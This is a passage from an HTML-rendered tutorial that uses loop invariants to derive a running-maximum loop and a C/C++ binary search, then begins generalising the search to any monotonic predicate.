<p>Inside the loop, we want to maintain the invariant for the next iteration of the loop – that <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>o</mi><mi>s</mi><mi>t</mi><mo>=</mo><mi>max</mi><mo>&#x2061;</mo><mo stretchy="false">(</mo><mi>v</mi><mi>a</mi><mi>l</mi><mi>s</mi><mo stretchy="false">[</mo><mn>0..</mn><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">most = \max(vals[0..i])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">max</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord">0</span><span class="mord">.</span><span class="mord">.</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mclose">)</span></span></span></span>. We’re guaranteed by our invariant that <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>o</mi><mi>s</mi><mi>t</mi><mo>=</mo><mi>max</mi><mo>&#x2061;</mo><mo stretchy="false">(</mo><mi>v</mi><mi>a</mi><mi>l</mi><mi>s</mi><mo stretchy="false">[</mo><mn>0..</mn><mi>i</mi><mo>&#x2212;</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">most = \max(vals[0..i-1])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">max</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord">0</span><span class="mord">.</span><span class="mord">.</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">&#x2212;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mclose">)</span></span></span></span>, which we use in the body of the loop</p>

<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.24999999999999992em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>m</mi><mi>o</mi><mi>s</mi><mi>t</mi><mo>&#x2190;</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi>max</mi><mo>&#x2061;</mo><mo stretchy="false">(</mo><mi>v</mi><mi>a</mi><mi>l</mi><mi>s</mi><mo stretchy="false">[</mo><mn>0..</mn><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>max</mi><mo>&#x2061;</mo><mo stretchy="false">(</mo><mi>v</mi><mi>a</mi><mi>l</mi><mi>s</mi><mo stretchy="false">[</mo><mn>0..</mn><mi>i</mi><mo>&#x2212;</mo><mn>1</mn><mo stretchy="false">]</mo><mo separator="true">,</mo><mi>v</mi><mi>a</mi><mi>l</mi><mi>s</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>max</mi><mo>&#x2061;</mo><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>s</mi><mi>t</mi><mo separator="true">,</mo><mi>v</mi><mi>a</mi><mi>l</mi><mi>s</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}
most \gets&amp; \max(vals[0..i])
\\ &amp;= \max(vals[0..i-1], vals[i])
\\ &amp;= \max(most, vals[i]).
\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.500000000000002em;vertical-align:-2.000000000000001em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5000000000000004em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">←</span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"></span></span><span style="top:-1.6599999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.000000000000001em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5000000000000004em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">max</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord">0</span><span class="mord">.</span><span class="mord">.</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mclose">)</span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mop">max</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord">0</span><span class="mord">.</span><span class="mord">.</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mclose">)</span></span></span><span style="top:-1.6599999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mop">max</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mclose">)</span><span class="mord">.</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.000000000000001em;"><span></span></span></span></span></span></span></span></span></span></span></span></p>

<p>In this example, we used the loop invariant to determine the body of the loop.</p>

<h2 id="binary-search"><a href="#binary-search">Binary Search</a></h2>

<p>For our binary search, we’ll find the first element in <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo stretchy="false">[</mo><mi>N</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">A[N]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">]</span></span></span></span> that’s not larger than <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span><sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote">1</a></sup>, returning one past the end if it’s not found<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote">2</a></sup>. For this, we’ll have two variables:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="kt">int</span> <span class="n">lo</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">hi</span> <span class="o">=</span> <span class="n">N</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Let <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span></span> be a predicate which is true if <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>&#x2265;</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">A[i] \ge x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&#x2265;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span>. We’ll have 3 invariants:</p>

<ol>
  <li>None of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0..</mn><mi>l</mi><mi>o</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0..lo]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mord">.</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mclose">]</span></span></span></span> satisfy <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>.</li>
  <li>All of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>h</mi><mi>i</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi>N</mi><mo>&#x2212;</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[hi..N-1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord">.</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">&#x2212;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span> satisfy <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>.</li>
  <li>The loop only runs while there are indices between <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi></mrow><annotation encoding="application/x-tex">lo</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span></span></span></span> and <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">hi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span></span></span></span>.</li>
</ol>

<p>In our loop, we update either <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi></mrow><annotation encoding="application/x-tex">lo</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span></span></span></span> or <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">hi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span></span></span></span> depending on if the midpoint <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">mid</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span></span></span></span> satisfies <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>:</p>

<ol>
  <li>If <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>m</mi><mi>i</mi><mi>d</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(mid)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mclose">)</span></span></span></span> then <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mi>i</mi><mo>&#x2190;</mo><mi>m</mi><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">hi \gets mid</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&#x2190;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span></span></span></span></li>
  <li>Otherwise, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">mid</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span></span></span></span> does not satisfy <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span> and so <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi><mo>&#x2190;</mo><mi>m</mi><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">lo \gets mid</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&#x2190;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span></span></span></span>.</li>
</ol>

<p>In both of these cases, we look at our invariants to avoid off-by-one errors.</p>

<!-- TODO binary search diagram:
     0               N-1
    >-------------------<
..._.                   ._..
..._|_______||          |_...
...__________|   ||     |_...
^ blue      green ^       ^ red
              pivot

    (and so on, until red meets blue)
-->

<p>From this, we can write the loop:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="k">while</span><span class="p">(</span><span class="n">lo</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">&lt;</span> <span class="n">hi</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">int</span> <span class="n">mid</span> <span class="o">=</span> <span class="n">lo</span> <span class="o">+</span> <span class="p">(</span><span class="n">hi</span> <span class="o">-</span> <span class="n">lo</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span>
	<span class="k">if</span><span class="p">(</span><span class="n">A</span><span class="p">[</span><span class="n">mid</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">X</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">hi</span> <span class="o">=</span> <span class="n">mid</span><span class="p">;</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="n">lo</span> <span class="o">=</span> <span class="n">mid</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Since <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">mid</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span></span></span></span> is always between <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi></mrow><annotation encoding="application/x-tex">lo</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span></span></span></span> and <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">hi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span></span></span></span><sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote">3</a></sup>, the loop must eventually terminate. After this loop ends, we’re guaranteed that:</p>

<ol>
  <li>There are no elements between <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo stretchy="false">[</mo><mi>l</mi><mi>o</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">A[lo]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mclose">]</span></span></span></span> and <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo stretchy="false">[</mo><mi>h</mi><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">A[hi]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mopen">[</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span>, which means that</li>
  <li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi></mrow><annotation encoding="application/x-tex">lo</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span></span></span></span> is the greatest index that doesn’t satisfy <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>, and</li>
  <li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">hi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span></span></span></span> is the smallest index that does.</li>
</ol>

<p>And so we return <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">hi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span></span></span></span>.</p>

<h2 id="generalising-pi"><a href="#generalising-pi">Generalising P(i)</a></h2>

<p>In the entirety of our binary search, we haven’t relied on any properties about <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span> other than the fact that it’s monotonic:</p>

<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.24999999999999992em" columnalign="right left right" columnspacing="0em 1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>&#x2005;&#x200a;</mtext><mo>&#x27f9;</mo><mtext>&#x2005;&#x200a;</mtext><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mtext>and</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi mathvariant="normal">&#xac;</mi><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>&#x2005;&#x200a;</mtext><mo>&#x27f9;</mo><mtext>&#x2005;&#x200a;</mtext><mi mathvariant="normal">&#xac;</mi><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo>&#x2212;</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}
P(i) &amp;\implies P(i+1) &amp; \textrm{and} \\
\neg P(i) &amp;\implies \neg P(i-1)
\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.0000000000000004em;vertical-align:-1.2500000000000002em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7500000000000002em;"><span style="top:-3.91em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">¬</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2500000000000002em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7500000000000002em;"><span style="top:-3.91em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⟹</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⟹</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">¬</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span><span 